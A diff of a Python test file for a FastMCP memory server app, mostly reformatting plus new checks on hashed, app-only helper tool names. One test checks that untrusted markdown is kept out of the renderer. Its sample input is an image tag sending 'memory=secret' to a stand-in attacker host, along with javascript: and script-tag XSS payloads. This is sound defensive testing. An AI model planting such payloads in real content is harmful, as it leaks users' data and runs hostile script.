@@ -1,8 +1,8 @@
 from __future__ import annotations
 
-from dataclasses import replace
 import json
 import re
+from dataclasses import replace
 
 import pytest
 from fastmcp import Client, FastMCPApp
@@ -63,7 +63,11 @@ async def test_app_exposes_one_model_entry_and_marks_helpers_app_only(
     async with Client(server) as client:
         tools = {tool.name: tool for tool in await client.list_tools()}
 
-    assert set(tools) == {
+    assert {
+        name
+        for name, tool in tools.items()
+        if tool.meta.get("ui", {}).get("visibility") != ["app"]
+    } == {
         "memory_glob",
         "memory_grep",
         "memory_edit",
@@ -76,6 +80,16 @@ async def test_app_exposes_one_model_entry_and_marks_helpers_app_only(
         "memory_delete",
         "memory_browse",
     }
+    helpers = {
+        name: tool
+        for name, tool in tools.items()
+        if tool.meta.get("ui", {}).get("visibility") == ["app"]
+    }
+    assert len(helpers) == 5
+    assert all(
+        re.fullmatch(r"[0-9a-f]{12}_ui_memory_(list|read|save|append|delete)", name)
+        for name in helpers
+    )
     browse = tools["memory_browse"]
     assert browse.inputSchema["properties"] == {}
     assert browse.meta["ui"]["visibility"] == ["model"]
@@ -85,9 +99,7 @@ async def test_app_exposes_one_model_entry_and_marks_helpers_app_only(
     )
 
     app = next(
-        provider
-        for provider in server.providers
-        if isinstance(provider, FastMCPApp)
+        provider for provider in server.providers if isinstance(provider, FastMCPApp)
     )
     app_tools = {tool.name: tool for tool in await app.list_tools()}
     assert set(app_tools) == {
@@ -157,9 +169,7 @@ async def test_open_payload_bootstraps_without_plaintext_memory_or_scope(
         assert _backend_name(payload, local_name)
 
 
-async def test_ui_backend_calls_are_hashed_and_use_current_context(
-    service, resolver
-):
+async def test_ui_backend_calls_are_hashed_and_use_current_context(service, resolver):
     server = create_mcp_server(service, resolver, include_app=True)
 
     async with Client(server) as client:
@@ -350,7 +360,11 @@ async def test_app_instance_rejects_cross_identity_or_cross_agent_reuse(
         else:
             resolver.invocation = replace(
                 current,
-                **{f"{changed_binding}_id" if changed_binding == "principal" else changed_binding: f"different-{changed_binding}"},
+                **{
+                    f"{changed_binding}_id"
+                    if changed_binding == "principal"
+                    else changed_binding: f"different-{changed_binding}"
+                },
             )
         service.calls.clear()
         result = await client.call_tool(
@@ -402,7 +416,7 @@ async def test_untrusted_markdown_is_not_embedded_in_the_initial_renderer(
 ):
     malicious = (
         '<img src="https://attacker.invalid/leak?memory=secret">\n'
-        '[click](javascript:alert(document.domain))\n<script>alert(1)</script>'
+        "[click](javascript:alert(document.domain))\n<script>alert(1)</script>"
     )
     service.snapshot = replace(service.snapshot, content=malicious)
     server = create_mcp_server(service, resolver, include_app=True)
